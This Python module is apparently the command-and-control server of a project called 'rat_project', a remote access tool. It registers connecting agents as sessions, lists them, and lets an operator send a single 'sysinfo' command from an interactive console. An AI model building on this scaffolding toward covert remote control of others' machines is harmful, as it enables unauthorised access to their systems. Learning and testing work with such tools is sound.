import socket
import threading
import time
from typing import Any


from rat_project.common.protocol import decode_message, encode_message
from rat_project.utils.logger_config import setup_logger

HOST = "127.0.0.1"
PORT = 8888

logger = setup_logger("server")

sessions: dict[int, dict[str, Any]] = {}
session_lock = threading.Lock()
session_counter = 0


def register_session(conn: socket.socket, addr: tuple[str, int], payload: dict[str, Any]) -> int:
    global session_counter

    with session_lock:
        session_counter += 1
        session_id = session_counter
        sessions[session_id] = {
            "conn": conn,
            "ip": addr[0],
            "port": addr[1],
            "hostname": payload.get("hostname", "unknown"),
            "os": payload.get("os", "unknown"),
            "release": payload.get("release", "unknown"),
        }

    logger.info(
        "Session %s registered for %s:%s (%s | %s %s)",
        session_id,
        addr[0],
        addr[1],
        payload.get("hostname", "unknown"),
        payload.get("os", "unknown"),
        payload.get("release", "unknown"),
    )
    return session_id


def remove_session(session_id: int) -> None:
    with session_lock:
        if session_id in sessions:
            del sessions[session_id]
            logger.info("Session %s removed", session_id)


def list_sessions() -> None:
    with session_lock:
        if not sessions:
            logger.info("No active sessions")
            return

        logger.info("Active sessions:")
        for session_id, session_data in sessions.items():
            logger.info(
                "Session %s | %s:%s | %s | %s %s",
                session_id,
                session_data["ip"],
                session_data["port"],
                session_data["hostname"],
                session_data["os"],
                session_data["release"],
            )


def get_session(session_id: int) -> dict[str, Any] | None:
    with session_lock:
        return sessions.get(session_id)


def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
    session_id = None

    try:
        logger.info("Client connected from %s:%s", addr[0], addr[1])

        data = conn.recv(4096)
        payload = decode_message(data.decode("utf-8").strip())

        if payload.get("type") != "register":
            logger.warning("Invalid first message from %s:%s", addr[0], addr[1])
            conn.sendall(
                encode_message(
                    {
                        "type": "error",
                        "message": "first message must be register",
                    }
                )
            )
            return

        session_id = register_session(conn, addr, payload)

        conn.sendall(
            encode_message(
                {
                    "type": "ack",
                    "message": f"session {session_id} registered",
                    "session_id": session_id,
                }
            )
        )
        logger.info("Acknowledgement sent to session %s", session_id)

        list_sessions()

        while True:
            if get_session(session_id) is None:
                break
            time.sleep(0.2)

    except Exception as exc:
        logger.exception("Error while handling client %s:%s: %s", addr[0], addr[1], exc)

    finally:
        if session_id is not None:
            remove_session(session_id)
            logger.info("Session %s disconnected", session_id)

        conn.close()
        logger.info("Connection closed for %s:%s", addr[0], addr[1])


def accept_clients(server_socket: socket.socket) -> None:
    while True:
        try:
            conn, addr = server_socket.accept()
            logger.info("Incoming connection accepted from %s:%s", addr[0], addr[1])

            thread = threading.Thread(
                target=handle_client,
                args=(conn, addr),
                daemon=True,
            )
            thread.start()

        except Exception as exc:
            logger.exception("Error while accepting clients: %s", exc)


def interact_with_session(session_id: int) -> None:
    logger.info("Opening interaction with session %s", session_id)
    session = get_session(session_id)

    if session is None:
        logger.warning("Session %s not found", session_id)
        print("Session not found.")
        return

    conn = session["conn"]

    while True:
        try:
            command = input(f"rat agent {session_id} > ").strip()

            if command == "back":
                logger.info("Leaving interaction with session %s", session_id)
                break

            if command == "help":
                print("Available agent commands:")
                print("  sysinfo   - get OS-specific system information")
                print("  back      - return to main console")
                continue

            if command == "sysinfo":
                logger.info("Sending 'sysinfo' command to session %s", session_id)
                conn.sendall(encode_message({"type": "command", "command": "sysinfo"}))

                data = conn.recv(65536)
                response = decode_message(data.decode("utf-8").strip())

                logger.info("Response received from session %s", session_id)
                print(response.get("output", "No output received"))
                continue

            logger.warning("Unknown agent command for session %s: %s", session_id, command)
            print("Unknown command. Type 'help'.")

        except Exception as exc:
            logger.exception("Error while interacting with session %s: %s", session_id, exc)
            print("An error occurred while interacting with the session.")
            break


def command_loop() -> None:
    while True:
        try:
            command = input("rat > ").strip()

            if not command:
                continue

            if command == "help":
                print("Available commands:")
                print("  help            - show commands")
                print("  sessions        - list active sessions")
                print("  interact <id>   - interact with a session")
                print("  exit            - stop server")

            elif command == "sessions":
                list_sessions()

            elif command.startswith("interact "):
                _, session_id_str = command.split(maxsplit=1)

                if not session_id_str.isdigit():
                    logger.warning("Invalid session id entered: %s", session_id_str)
                    print("Session id must be a number")
                    continue

                interact_with_session(int(session_id_str))

            elif command == "exit":
                logger.info("Stopping server...")
                print("Stopping server...")
                break

            else:
                logger.warning("Unknown server command: %s", command)
                print("Unknown command. Type 'help'.")

        except KeyboardInterrupt:
            logger.info("Server interrupted by user")
            print("\nStopping server...")
            break

        except Exception as exc:
            logger.exception("Error in command loop: %s", exc)
            print("An error occurred in the server console.")


def run_server() -> None:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.bind((HOST, PORT))
            server_socket.listen(5)

            logger.info("Server listening on %s:%s", HOST, PORT)

            accept_thread = threading.Thread(
                target=accept_clients,
                args=(server_socket,),
                daemon=True,
            )
            accept_thread.start()

            command_loop()

    except Exception as exc:
        logger.exception("Server error: %s", exc)


if __name__ == "__main__":
    run_server()
